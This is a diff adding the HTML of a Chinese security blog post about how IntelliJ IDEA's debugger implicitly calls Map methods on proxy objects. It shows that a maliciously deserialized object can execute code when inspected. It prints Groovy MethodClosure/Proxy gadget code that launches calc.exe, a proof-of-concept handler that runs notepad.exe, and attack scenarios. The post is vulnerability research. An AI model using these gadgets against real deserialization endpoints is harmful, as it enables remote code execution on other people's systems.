@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  <title>后反序列化攻击调试中的IDE | 么哈么哈</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="IDEA 在调试 goovy gadget 代码时会在调试的过程中触发很多次代码执行，给调试工作造成了一些困惑，但是同时也让笔者想起了《后反序列化漏洞》文章中的思路，IDEA 在调试状态下可能会隐式的触发很多函数。 123456789ObjectInputStream ois = new ObjectInputStream(new FileInputStream(new File(&quot;D:\\tmp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="后反序列化攻击调试中的IDE">
+<meta property="og:url" content="http://mohamoha.club/2021/04/30/IDEA/index.html">
+<meta property="og:site_name" content="么哈么哈">
+<meta property="og:description" content="IDEA 在调试 goovy gadget 代码时会在调试的过程中触发很多次代码执行，给调试工作造成了一些困惑，但是同时也让笔者想起了《后反序列化漏洞》文章中的思路，IDEA 在调试状态下可能会隐式的触发很多函数。 123456789ObjectInputStream ois = new ObjectInputStream(new FileInputStream(new File(&quot;D:\\tmp">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://mohamoha.club/afterward_attack_IDEA/debugger.png">
+<meta property="og:image" content="http://mohamoha.club/afterward_attack_IDEA/proxy.png">
+<meta property="og:updated_time" content="2021-07-11T07:46:01.822Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="后反序列化攻击调试中的IDE">
+<meta name="twitter:description" content="IDEA 在调试 goovy gadget 代码时会在调试的过程中触发很多次代码执行，给调试工作造成了一些困惑，但是同时也让笔者想起了《后反序列化漏洞》文章中的思路，IDEA 在调试状态下可能会隐式的触发很多函数。 123456789ObjectInputStream ois = new ObjectInputStream(new FileInputStream(new File(&quot;D:\\tmp">
+<meta name="twitter:image" content="http://mohamoha.club/afterward_attack_IDEA/debugger.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">么哈么哈</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">Too young, Too simple, Sometime naive</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="https://github.com">github</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://mohamoha.club"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-IDEA" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/04/30/IDEA/" class="article-date">
+  <time datetime="2021-04-29T16:00:00.000Z" itemprop="datePublished">2021-04-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      后反序列化攻击调试中的IDE
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>IDEA 在调试 goovy gadget 代码时会在调试的过程中触发很多次代码执行，给调试工作造成了一些困惑，但是同时也让笔者想起了《后反序列化漏洞》文章中的思路，IDEA 在调试状态下可能会隐式的触发很多函数。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(<span class="string">"D:\\tmp\\commonbean.payload"</span>)));</span><br><span class="line">ois.readObject();</span><br><span class="line">MethodClosure methodClosure = <span class="keyword">new</span> MethodClosure(<span class="string">"calc.exe"</span>,<span class="string">"execute"</span>);</span><br><span class="line"><span class="keyword">final</span> ConvertedClosure closure = <span class="keyword">new</span> ConvertedClosure(methodClosure,<span class="string">"entrySet"</span>);</span><br><span class="line">Class&lt;?&gt;[] allInterfaces = (Class&lt;?&gt;[]) Array.newInstance(Class<span class="class">.<span class="keyword">class</span>,1)</span>;</span><br><span class="line">allInterfaces[<span class="number">0</span>] = Map<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">Object o = Proxy.newProxyInstance(<span class="keyword">this</span>.getClass().getClassLoader(), allInterfaces, closure);</span><br><span class="line"><span class="keyword">final</span> Map map = Map<span class="class">.<span class="keyword">class</span>.<span class="title">cast</span>(<span class="title">o</span>)</span>;</span><br><span class="line">map.entrySet().iterator();</span><br></pre></td></tr></table></figure>
+<h2 id="现象分析"><a href="#现象分析" class="headerlink" title="现象分析"></a>现象分析</h2><p>编写如下测试代码, IVehical 是一个空的接口，VehicalInvacationHandler 是一个 handler，其 invoke 函数记录调用栈到本地文件中，main 函数通过 newProxyInstance 创建一个 Proxy 对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"Let's inspect the beans provided by Spring Boot:"</span>);</span><br><span class="line">    Object f = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> Class[] &#123; IVehical<span class="class">.<span class="keyword">class</span> &#125;, <span class="title">new</span> <span class="title">VehicalInvacationHandler</span>())</span>;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt;[] allInterfaces = (Class&lt;?&gt;[]) Array.newInstance(Class<span class="class">.<span class="keyword">class</span>,1)</span>;</span><br><span class="line">    allInterfaces[<span class="number">0</span>] = Map<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VehicalInvacationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">VehicalInvacationHandler</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        StackTraceElement[] arr = Thread.currentThread().getStackTrace();</span><br><span class="line">        String call_stack=<span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=arr.length-<span class="number">1</span>;i++)&#123;</span><br><span class="line">            call_stack+=(arr[i].getClassName()+<span class="string">";"</span>+arr[i].getMethodName()+<span class="string">";"</span>+arr[i].getFileName()+<span class="string">"\r\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        OutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">"D://tmp/call_stack"</span>+method.getName()+count++);</span><br><span class="line">        f.write(call_stack.getBytes());</span><br><span class="line">        f.close();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"notepad.exe"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IVehical</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<p>单步调试，并没有任何现象发生。与原始样本比较修改接口继承自 Map</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IVehical</span> <span class="keyword">extends</span> <span class="title">Map</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>再次调试，可以发现当执行完 newProxyInstance 方法，调试窗口中出现 <code>f</code> 对象时，在目标文件夹下出现了文件 <code>call_stackisEmpty0</code>,<code>call_stackentrySet1</code>,<code>call_stacksize2</code>，并且弹出了三次记事本。当鼠标移动到 <code>f</code> 对象上查看时也会弹出记事本，并且生成文件 <code>call_stackentrySetx</code>。</p>
+<p>由此可以推知，IDEA 的调试窗口在遇到实现了 Map 接口的对象时会隐式的调用其中的 <code>isEmpty</code>,<code>entrySet</code>和<code>size</code>方法，用户主动查看对象内容时会隐式的调用 <code>entrySet</code> 方法。其中当 <code>isEmpty</code> 返回空时才会调用 <code>entrySet</code></p>
+<p><img src="/afterward_attack_IDEA/debugger.png" alt></p>
+<ul>
+<li>当 <code>isEmpty</code> 返回 <code>true</code> 时对象不会出现下拉选项，鼠标查看对象时也不会触发 <code>entrySet</code> 方法。</li>
+<li>当 <code>isEmpty</code> 返回 <code>false</code> 时对象会出现下拉选项，点击下拉选项或者鼠标查看对象时会触发 <code>entrySet</code> 方法。</li>
+<li>当 <code>isEmpty</code> 返回 <code>null</code> 时，会调用 <code>entrySet</code> 方法</li>
+<li>图中红色的错误是由于调用 <code>size</code> 返回 null 导致的</li>
+<li>图中白色的错误是由于调用 <code>entrySet</code> 方法返回 null 导致的</li>
+</ul>
+<p><img src="/afterward_attack_IDEA/proxy.png" alt></p>
+<h2 id="场景类比"><a href="#场景类比" class="headerlink" title="场景类比"></a>场景类比</h2><p>结合后反序列化一文中给出的思路，Map 对象的这一类隐式调用问题也存在类似的攻击场景</p>
+<ul>
+<li>当攻击者向支持反序列化的服务发送恶意数据后，虽然当时不会直接触发。不过假如出现特殊情况工程师需要复现这条序列化数据进行调试查看应用哪里出了问题时，恶意对象即可在其Debugger中显示出来，由此触发了RCE。</li>
+<li>攻击者给受害者发送了需要反序列化的文件，受害者如果要通过使用IDEA将其反序列化出来同时还处于debug模式时，就会触发RCE。</li>
+</ul>
+<p>Gadgets 可以使用 CommonCollection1 或者文章开始贴出的 goovy ，这里不再赘述。</p>
+<p>虽然理论上存在这样的攻击场景，但是笔者认为在实际应用中这种攻击发生的概率还是很低的。</p>
+<h2 id="后反序列化攻击Java应用"><a href="#后反序列化攻击Java应用" class="headerlink" title="后反序列化攻击Java应用"></a>后反序列化攻击Java应用</h2><p>如果纯粹从理论角度分析，Map 接口对象也是可以攻击 Java 应用的。 在 Map 对象被反序列化构造出来之后，大概率会调用其中的某些方法，常用的比如说 <code>isEmpty</code>,<code>entrySet</code> 等，那么这个恶意的对象一旦被当成一个正常的 Map 实例去使用的话，则大概率会出现问题。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MethodClosure methodClosure = <span class="keyword">new</span> MethodClosure(<span class="string">"calc.exe"</span>,<span class="string">"execute"</span>);</span><br><span class="line"><span class="keyword">final</span> ConvertedClosure closure = <span class="keyword">new</span> ConvertedClosure(methodClosure,<span class="string">"isEmpty"</span>);</span><br><span class="line">Class&lt;?&gt;[] allInterfaces = (Class&lt;?&gt;[]) Array.newInstance(Class<span class="class">.<span class="keyword">class</span>,1)</span>;</span><br><span class="line">allInterfaces[<span class="number">0</span>] = Map<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">Object o = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), allInterfaces, closure);</span><br><span class="line"><span class="keyword">final</span> Map map = Map<span class="class">.<span class="keyword">class</span>.<span class="title">cast</span>(<span class="title">o</span>)</span>;</span><br><span class="line"></span><br><span class="line">map.isEmpty();</span><br></pre></td></tr></table></figure>
+<p>但是一切的一切都需要反序列化执行的上下文中存在对应的 gadget 才行，任重而道远。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>此类所谓“后反序列化”问题虽然难以产生什么直接的影响，但是却为我们寻找 gadget 提供了新的思路。研究者可以以反序列化对象的整个生命周期为起点构造调用链，同时这种方法还有可能绕过某些检测手段的限制。</p>
+<p>其实后反序列化本质上就是将 gadget 中第一层或者前几层 readObject 函数中的操作扩展到了函数上下文中，从而缩短了 gadget 的构造路径。</p>
+<p>以上是笔者作为一个初学者对后反序列化的浅薄看法，如有不当还请各位读者指正。</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] <a href="https://paper.seebug.org/1133/" target="_blank" rel="noopener">https://paper.seebug.org/1133/</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://mohamoha.club/2021/04/30/IDEA/" data-id="ckqyxnmce000ahkuq7n26fjli" class="article-share-link">Share</a>
+      
+        <a href="http://mohamoha.club/2021/04/30/IDEA/#disqus_thread" class="article-comment-link">Comments</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/05/30/JavascriptInterface_once_more/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          JavaScriptInterface Once More
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/08/16/chrome_dead_lock/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">解决 Chrome 启动进程卡顿问题</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<section id="comments">
+  <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+</section>
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/05/30/JavascriptInterface_once_more/">JavaScriptInterface Once More</a>
+          </li>
+        
+          <li>
+            <a href="/2021/04/30/IDEA/">后反序列化攻击调试中的IDE</a>
+          </li>
+        
+          <li>
+            <a href="/2020/08/16/chrome_dead_lock/">解决 Chrome 启动进程卡顿问题</a>
+          </li>
+        
+          <li>
+            <a href="/2019/09/14/Link_file_and_sdcard/">Link File and Sdcard in Android</a>
+          </li>
+        
+          <li>
+            <a href="/2019/01/06/AST_Fuzzer/">AST Fuzz —— a New Kind of Fuzzer</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+    <div class="widget tag">
+    <h3 class="title">Site Links</h3>
+    <ul class="entry">
+    <li><a href="http://5alt.me" title="5alt">5alt's Blog</a></li>
+    </ul>
+</div>
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 mohaplus<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="https://github.com" class="mobile-nav-link">github</a>
+  
+</nav>
+    
+<script>
+  var disqus_shortname = 'mohamoha';
+  
+  var disqus_url = 'http://mohamoha.club/2021/04/30/IDEA/';
+  
+  (function(){
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
